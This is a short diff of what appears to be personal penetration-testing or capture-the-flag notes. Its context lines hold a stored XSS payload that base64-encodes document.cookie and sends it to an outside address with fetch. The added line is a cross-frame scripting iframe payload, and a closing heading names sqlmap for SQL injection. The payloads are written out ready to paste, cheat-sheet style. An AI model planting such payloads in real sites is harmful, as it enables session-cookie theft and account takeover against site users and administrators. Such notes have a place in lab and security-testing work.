@@ -10,6 +10,7 @@ Stored XSS code (for support tickets and admin review):
     <script>fetch('http://10.49.96.188:9001?cookie=' + btoa(document.cookie) );</script>
 ```
 
+XFS:`<iframe src="javascript:alert(`xss`)">_`
 
 <span style="color:rgb(255, 255, 0)">SQL Injection</span>
 sqlmap: tool used for sql injection
